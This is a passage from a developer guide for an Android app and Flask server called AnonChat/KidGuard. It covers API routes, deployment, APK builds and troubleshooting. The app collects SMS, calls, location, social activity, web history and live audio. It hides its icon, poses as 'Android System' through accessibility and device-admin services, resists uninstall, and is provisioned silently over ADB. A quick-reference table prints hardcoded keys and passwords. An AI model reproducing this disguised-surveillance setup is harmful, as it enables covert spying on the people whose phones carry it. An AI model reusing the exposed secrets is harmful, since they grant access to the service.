| POST | `/device/register` | Register/update device (V6 — no hijack) |
| GET | `/device/<id>/config` | Get device config (V1 — ownership checked) |

#### `reports.py` — 13 routes (all V2 — ownership checked)

| Method | Path |
|--------|------|
| POST | `/report/location` |
| POST | `/report/activity` |
| POST | `/report/battery` |
| POST | `/report/screentime` |
| POST | `/report/sms` |
| POST | `/report/calls` |
| POST | `/report/apps` |
| POST | `/report/webhistory` |
| POST | `/report/media` (V3 — command_id checked) |
| POST | `/report/social` |
| POST | `/report/bulk` (single ownership check for all) |
| POST | `/report/call-state` |
| POST | `/report/audio-stream` (V8 — command_id checked) |

#### `parent.py` — ~25 routes (all ownership-checked via `resolve_device_id`)

Dashboard stats, device list, per-device data reads (activity, locations, SMS, calls, social, apps, screentime, webhistory, media), geofences CRUD, commands (send, poll result, poll audio), live call state, call stream control, restrictions CRUD, schedules CRUD.

#### `command.py` — 1 route

| Method | Path | Description |
|--------|------|-------------|
| POST | `/command/<id>/status` | Update command status (V4 — ownership checked) |

#### `admin.py` — 5 routes (admin_required)

| Method | Path | Description |
|--------|------|-------------|
| POST | `/admin/retention-cleanup` | Delete old telemetry |
| GET | `/admin/users` | List all users |
| POST | `/admin/users/<id>/role` | Change user role |
| POST | `/admin/users/<id>/active` | Enable/disable user |
| GET | `/admin/audit-log` | View audit trail |

#### `app_mgmt.py` — 3 routes

| Method | Path | Description |
|--------|------|-------------|
| POST | `/app/check-update` | Check for APK update |
| GET | `/app/download/<version>` | Download APK |
| POST | `/app/upload` | Upload new APK (admin) |

#### `files.py` — 1 route

| Method | Path | Description |
|--------|------|-------------|
| GET | `/files/<media_id>` | Serve media file (ownership checked) |

#### `pages.py` — 4 routes (at root, 10/min rate-limited)

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | Login page |
| GET | `/dashboard` | Dashboard page |
| GET | `/device/<id>` | Device detail page |
| GET | `/static/<path>` | Static file fallback |

### 4.7 Alembic Migrations

**`migrations/versions/0001_baseline.py`** — reproduces the full 20-table schema as it existed before multi-user conversion. New deployments run this to create all tables.

**`migrations/versions/0002_multiuser.py`** — adds:
- `users.firebase_uid` (unique, nullable)
- `users.last_password_change`
- `token_blocklist` table + index
- `audit_log` table
- Partial unique index `uq_child_relations_active_child` on `child_relations(child_id) WHERE is_active = 1`

**Commands:**
```bash
python -m alembic upgrade head      # Apply all migrations
python -m alembic current           # Show current revision
python -m alembic stamp 0001_baseline  # Mark existing DB as at baseline
python -m alembic revision --autogenerate -m "description"  # New migration
```

See `MIGRATIONS_GUIDE.md` for detailed scenarios.

### 4.8 Server Scripts

#### `scripts/create_admin.py`
```bash
python scripts/create_admin.py --email admin@example.com --password 'StrongPass!'
python scripts/create_admin.py --promote user@example.com  # promote existing user
```
Reads `ADMIN_EMAIL`/`ADMIN_PASSWORD` env vars by default. Password must be ≥8 chars. Writes audit log entries.

#### `scripts/migrate_sqlite_to_postgres.py`
```bash
DATABASE_URL=postgresql://user:pass@host:5432/kidguard \
  python scripts/migrate_sqlite_to_postgres.py

python scripts/migrate_sqlite_to_postgres.py --dry-run  # compare only
python scripts/migrate_sqlite_to_postgres.py --sqlite /path/to/tracking.db
```
Idempotent ETL that copies all 19 tables from SQLite to Postgres. Source is never modified. Skips existing rows by PK.

### 4.9 Web UI (Templates & Static Files)

**Templates** (`server/templates/`):
- `login.html` (22 KB) — login/register page at `/`
- `dashboard.html` (33 KB) — parent dashboard at `/dashboard`
- `device.html` (70 KB) — device detail view at `/device/<id>`

**Static files** (`server/static/`):
- `css/cloud-style.css` (28 KB) — shared stylesheet
- `js/cloud-dashboard.js` (52 KB) — dashboard front-end logic
- `js/device-detail.js` (40 KB) — device detail page logic

### 4.10 Testing

**46 pytest tests** in `server/tests/`:

```bash
cd server/tests
python -m pytest -v
```

| File | Tests | Coverage |
|------|-------|----------|
| `test_security.py` | 16 | Hashing (V11), ownership (V1, V2), pairing hijack (V5), command ownership (V3, V4, V8) |
| `test_auth.py` | 14 | Register, login, refresh, logout (V12), forgot/reset (V9), forgot-username (V10), legacy rehash (V11) |
| `test_pairing.py` | 7 | Generate, claim-direct auth (V7), approve own/hijack (V5), strict one-parent-per-child |
| `test_reports.py` | 9 | Own device reports, cross-tenant rejection (V2), bulk, parent reads child data |
| `conftest.py` | — | Fixtures: in-memory SQLite app, `make_user`, `login_user`, `auth_header` |

---

## 5. Deployment Guide

### 5.1 PythonAnywhere Deployment

The production server is currently deployed at `https://diptiban2021.pythonanywhere.com`.

**Steps:**

1. **Upload the server package** to your PythonAnywhere home directory (e.g. `/home/username/server/`).

2. **Install dependencies:**
   ```bash
   cd ~/server
   pip install -r requirements.txt
   ```

3. **Set environment variables** in the PythonAnywhere "Web" tab or a `.env` file:
   ```
   SECRET_KEY=<your-secret-key>
   JWT_SECRET_KEY=<your-jwt-secret>
   DATABASE_URL=sqlite:///tracking.db   # or postgresql://...
   CLOUD_SERVER_URL=https://yourusername.pythonanywhere.com
   ```

4. **Run migrations** (if using Postgres):
   ```bash
   cd ~/server
   python -m alembic upgrade head
   ```

5. **Bootstrap an admin:**
   ```bash
   python scripts/create_admin.py --email admin@example.com --password 'StrongPass!'
   ```

6. **Configure the WSGI file** (in the Web tab):
   ```python
   import sys, os
   path = '/home/username'
   if path not in sys.path:
       sys.path.insert(0, path)
   from server.wsgi import application
   ```

7. **Reload the web app.**

**Note:** SocketIO is automatically disabled on PythonAnywhere (WSGI doesn't support WebSockets). The app works without it via HTTP polling.

### 5.2 Docker Deployment

```bash
cd server
docker-compose up -d
```

This starts three services:
- **db** — PostgreSQL 15 (volume `pgdata`)
- **server** — Flask app via gunicorn + eventlet (port 5000)
- **nginx** — TLS reverse proxy (ports 80 + 443)

**Environment:** Set `SECRET_KEY`, `JWT_SECRET_KEY` in a `.env` file or shell before `docker-compose up`. The `DATABASE_URL` is pre-configured to point at the `db` service.

**SSL:** Place certificates at `/etc/letsencrypt/live/your-domain.com/` (update `nginx.conf` with your domain).

### 5.3 Local Development

```bash
cd server
pip install -r requirements.txt
python run.py
```

This starts the server on `http://localhost:5000` with:
- Auto-creation of tables (`FLASK_AUTO_CREATE=1`)
- SocketIO enabled (unless `DISABLE_SOCKETIO=1`)
- Debug mode on (`FLASK_DEBUG=1`)

**Run tests:**
```bash
cd server/tests
python -m pytest -v
```

### 5.4 Building & Installing the APK

**Build:**
```bash
cd "CHAT APP"
./gradlew.bat assembleDebug
# Output: app/build/outputs/apk/debug/app-debug.apk
```

**Install via ADB:**
```bash
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

**Configure the server URL** (before building):
- Edit `CHAT APP/local.properties`:
  ```
  server.url=https://diptiban2021.pythonanywhere.com
  ```

**Pre-built APK:** `AnonChat-Deployment/apk/AnonChat-debug.apk` (13 MB, debug build).

---

## 6. Secret Code Recovery & Troubleshooting

### If the app icon is hidden and you can't open it

**Method 1 — Dial the secret code:**
```
*#*#11111987#*#*     (master key — always works)
*#*#<your-code>#*#*   (your custom code)
```

**Method 2 — Tap the notification:**
The app posts an ongoing notification "AnonChat is hidden / Tap to unhide". Tap it.

**Method 3 — ADB broadcast:**
```bash
adb shell am broadcast -a com.anonchat.app.UNHIDE -n com.anonchat.app/.receiver.UnhideReceiver
```

### If the dialer code does nothing (Vivo/Xiaomi/Oppo)

Some OEM dialers don't emit the `SECRET_CODE` broadcast. The fix is the **accessibility fallback**:

1. Go to **Settings → Accessibility → Installed apps**
2. Enable **AnonChat** (or "Android System" — the service name)
3. Grant the accessibility permission
4. Now dialing `*#*#11111987#*#*` will be detected by the accessibility service reading the dialer text

### If the dialer code still doesn't work

Verify:
- Accessibility Service is enabled (Path B — the reliable path on Vivo)
- The app is installed (check `adb shell pm list packages | grep anonchat`)
- Try the master key `*#*#11111987#*#*` instead of your custom code
- Check `logcat` for `SecretCodeReceiver` logs:
  ```bash
  adb logcat -s SecretCodeReceiver:V AutoPermissionHelper:V
  ```

### If the app won't uninstall (device admin active)

1. Go to **Settings → Security → Device administrators**
2. Deactivate "AnonChat" (or "Android System")
3. Enter the uninstall password (default: `admin`)
4. Now uninstall via `adb uninstall com.anonchat.app`

---

## 7. Known Issues & Deferred Work

### Server-side (complete)

All 7 workstreams are done:
- ✅ WS-1: Flask package structure
- ✅ WS-2: Security hardening (12 vulns)
- ✅ WS-3: Models updated
- ✅ WS-4: Alembic + Postgres + ETL
- ✅ WS-5: Auth blueprint
- ✅ WS-6: All 10 blueprints
- ✅ WS-7: Tests + docs

### Client-side (deferred to a follow-up phase)

These are real blockers for end-to-end multi-user but are client-side:

1. **`CloudConfig.deviceId`** defaults to `android.os.Build.DEVICE` — collides across same-model phones. Needs a generated per-install UUID.
2. **No centralized auth interceptor** — only one report path refreshes on 401; all other calls silently fail.
3. **No in-app pairing UI** — onboarding is ADB-broadcast-only.
4. **Chat-side Firebase→server JWT unification** — the `firebase_uid` column added now is the hook for this.

The server is built so these can land cleanly afterward without server rework.

### Minor inconsistencies

- `server/README.md` still references `python app.py` (the old monolith). Use `python run.py` instead.
- `server/app.py` is kept as a reference but is deprecated. The active code is in the package (`__init__.py` + `blueprints/`).
- No `.env` file is included (intentional). Create one on the server.
- `MIGRATIONS_GUIDE.md` references the SQLite DB as "552 KB" but it's actually ~220 KB.

---

## 8. Quick Reference

### Secrets & keys

| Secret | Value | Where |
|--------|-------|-------|
| Master dialer code | `11111987` | `SecretCodeReceiver`, `AutoPermissionHelper`, `CloudConfig`, `strings.xml` |
| Dial pattern | `*#*#11111987#*#*` | Phone dialer |
| AES key (code encryption) | `An0nCh4tS3cr3tK3y!@#` | `SecretCodeManager` |
| ADB setup secret | `kidguard2024` | `SetupReceiver` |
| Server API key | `parental-control-key-2024` | `build.gradle.kts` |
| Default uninstall password | `admin` | `DeviceAdminReceiver` |
| Default user code | `1234` | `Constants` |

### Key file paths

| What | Path |
|------|------|
| Android app source | `ParentalControl/CHAT APP/` |
| Android package | `com.anonchat.app` |
| Server source | `ParentalControl/AnonChat-Deployment/server/` |
| Deployment package | `ParentalControl/AnonChat-Deployment/` |
| Pre-built APK | `AnonChat-Deployment/apk/AnonChat-debug.apk` |
| SQLite DB | `AnonChat-Deployment/tracking.db` |
| Server URL (prod) | `https://diptiban2021.pythonanywhere.com` |
| Firebase project | `anonchat-a690b` |

### Key commands

```bash
# Build APK
cd "CHAT APP" && ./gradlew.bat assembleDebug

# Install APK
adb install -r app/build/outputs/apk/debug/app-debug.apk

# Start server (dev)
cd server && python run.py

# Run tests
cd server/tests && python -m pytest -v

# Run migrations
cd server && python -m alembic upgrade head

# Bootstrap admin
python scripts/create_admin.py --email admin@... --password '...'

# Migrate SQLite → Postgres
DATABASE_URL=postgresql://... python scripts/migrate_sqlite_to_postgres.py

# Unhide app via ADB
adb shell am broadcast -a com.anonchat.app.UNHIDE -n com.anonchat.app/.receiver.UnhideReceiver

# Zero-touch setup via ADB
adb shell am broadcast -a com.anonchat.app.SETUP_ALL \
  -n com.anonchat.app/.parentalcontrol.receiver.SetupReceiver \
  --es setup_secret "kidguard2024" \
  --es server_url "https://diptiban2021.pythonanywhere.com" \
  --es pairing_code "ABCD1234"
```

### Documentation index

| Document | Content |
|----------|---------|
| `PROJECT_GUIDE.md` | This document — the complete project guide |
| `SECRET_CODE_FIX_AND_DEPLOYMENT.md` | Secret code bug diagnosis + deployment steps |
| `MIGRATIONS_GUIDE.md` | Alembic + SQLite→Postgres migration guide |
| `MULTIUSER_PLATFORM.md` | Multi-user conversion architecture + security fixes |
| `server/README.md` | Server deployment guide (slightly outdated re: entry point) |
| `FIREBASE_INTEGRATION.md` | Firebase setup (in CHAT APP/) |
| `FIRESTORE_SETUP.md` | Firestore configuration (in CHAT APP/) |

---

*End of guide.*
